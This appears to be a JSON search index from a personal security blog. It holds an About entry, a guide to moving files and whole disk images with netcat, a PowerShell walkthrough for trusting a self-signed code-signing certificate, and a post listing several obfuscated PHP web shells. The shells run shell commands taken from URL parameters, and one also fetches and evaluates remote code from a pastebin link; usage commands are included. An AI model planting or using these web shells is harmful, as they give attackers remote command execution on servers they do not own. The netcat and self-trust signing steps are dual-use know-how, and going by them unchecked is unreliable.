[{"content":"Hello, I\u0026rsquo;m putthik and this is my blog writting about Cybersecurity topic and Malware research.\nThik\n","description":"About author of the blog","id":2,"section":"","tags":null,"title":"About","uri":"https://thiklab.com/about/"},{"content":"Netcat is like a swiss army knife for geeks. It can be used for just about anything involving TCP or UDP. One of its most practical uses is to transfer files. Non *nix people usually don\u0026rsquo;t have SSH setup, and it is much faster to transfer stuff with netcat then setup SSH. netcat is just a single executable, and works across all platforms (Windows,Mac OS X, Linux).\nOn the receiving end running,\n1  nc -l -p 1234 \u0026gt; out.file   will begin listening on port 1234.\nOn the sending end running,\n1  nc -w 3 [destination] 1234 \u0026lt; out.file   will connect to the receiver and begin sending file.\nFor faster transfers if both sender and receiver has some basic *nix tools installed, you can compress the file during sending process,\nOn the receiving end,\n1  nc -l -p 1234 | uncompress -c | tar xvfp -   On the receiving end,\n1  tar cfp - /some/dir | compress -c | nc -w 3 [destination] 1234   A much cooler but less useful use of netcat is, it can transfer an image of the whole hard drive over the wire using a command called dd.\nOn the sender end run,\n1  dd if=/dev/hda3 | gzip -9 | nc -l 3333   On the receiver end,\n1  nc [destination] 3333 | pv -b \u0026gt; hdImage.img.gz   Be warned that file transfers using netcat are not encrypted, anyone on the network can grab what you are sending, so use this only on trusted networks.\nBonus ","description":"Transferring files using netcat.","id":3,"section":"posts","tags":null,"title":"Using Netcat For File Transfers","uri":"https://thiklab.com/posts/using-netcat-for-file-transfers/"},{"content":"In order to use a non deprecated way to sign your own script, one should use New-SelfSignedCertificate.\nGenerate the Key 1 2  # Make sure you run as Administrator New-SelfSignedCertificate -DnsName email@yourdomain.com -Type CodeSigning -CertStoreLocation cert:\\CurrentUser\\My   Export Certification Without Private Key 1  Export-Certificate -Cert (Get-ChildItem Cert:\\CurrentUser\\My -CodeSigningCert)[0] -FilePath code_signing.crt   The [0] will make this work for cases when you have more than one certificate. Obviously make the index match the certificate you want to use or use a way to filtrate (by thumprint or issuer).\nImport as Trusted Publisher 1  Import-Certificate -FilePath .\\code_signing.crt -Cert Cert:\\CurrentUser\\TrustedPublisher   Import as Root Certificate Authority 1  Import-Certificate -FilePath .\\code_signing.crt -Cert Cert:\\CurrentUser\\Root   Item Cert:\\C\nSigning Application 1  Set-AuthenticodeSignature .\\app.exe -Certificate (Get-ChildItem Cert:\\CurrentUser\\My -CodeSigningCert)   Obviously once you have setup the key, you can simply sign any other scripts with it.\nSource: stackoverflow\n","description":"Creating certification for code signing on windows 10.","id":4,"section":"posts","tags":null,"title":"Self Signed Certification for Code Signing","uri":"https://thiklab.com/posts/ca-self-signed-certification-for-code-signing/"},{"content":"USh3ll-I 1  \u0026lt;?=$_=$_GET;$_[_]($_[0]); //.php?_=system\u0026amp;0=id;ls+-la    USh3ll-II 1  echo -e \u0026#34;\u0026lt;?=\\`\\$_REQUEST[_]\\`?\u0026gt;\u0026#34; \u0026gt; uni.php   1  echo -e \u0026#34;\u0026lt;?=\\`\\$_REQUEST[_]\\`?\u0026gt;\\r\u0026lt;?=\u0026#39;404 Not found\u0026#39;;?\u0026gt;\u0026#34; \u0026gt; uni.php   Usage: curl localhost/uni.php -d _=ls+-la\nUSh3ll-III 1  \u0026lt;?=$·û∂=$_GET;if($·û∂[·ûè]!=null)$·û∂[·ûõ]==·ûü·üí·ûö·ûõ·û∂·ûâ·üã\u0026amp;$·û∂[·ûò]($·û∂[·ûî]); //.php?·ûè=true\u0026amp;·ûõ=·ûü·üí·ûö·ûõ·û∂·ûâ·üã\u0026amp;·ûò=passthru\u0026amp;·ûî=ls    1  \u0026lt;?=$·û∂=$_GET;if($·û∂[·ûè]!=null)$·û∂[·ûõ]==·ûü·üí·ûö·ûõ·û∂·ûâ·üã\u0026amp;$·û∂[·ûò]($·û∂[·ûî]); eval(\u0026#39;?\u0026gt;\u0026#39;.file_get_contents($·û∂[·ûä]));?\u0026gt;    Usage: uni.php?·ûè=true\u0026amp;·ûõ=·ûü·üí·ûö·ûõ·û∂·ûâ·üã\u0026amp;·ûò=passthru\u0026amp;·ûî=id\u0026amp;·ûä=https://pastebin.com/raw/JfLvh0MG\nUSh3ll-IV 1  \u0026lt;?=$a=\u0026#34;sy\u0026#34;;$b=\u0026#34;stem\u0026#34;;$c=$a.$b; $c(\u0026#34;uname -a\u0026#34;); //get method    USh3ll-V 1  \u0026lt;?=$_[]=@(($·ûÄ=@$_REQUEST).($üòò=@$·ûÄ[0]).($üòò($·ûÄ[1]))); //curl -v \u0026#39;127.0.0.1:8080/uni.php?0=system\u0026amp;1=la+-la\u0026#39;    ","description":"A family of atom(s) php webshell script.","id":5,"section":"posts","tags":["php"],"title":"UniSh3ll Tutorial","uri":"https://thiklab.com/posts/unishell/"}]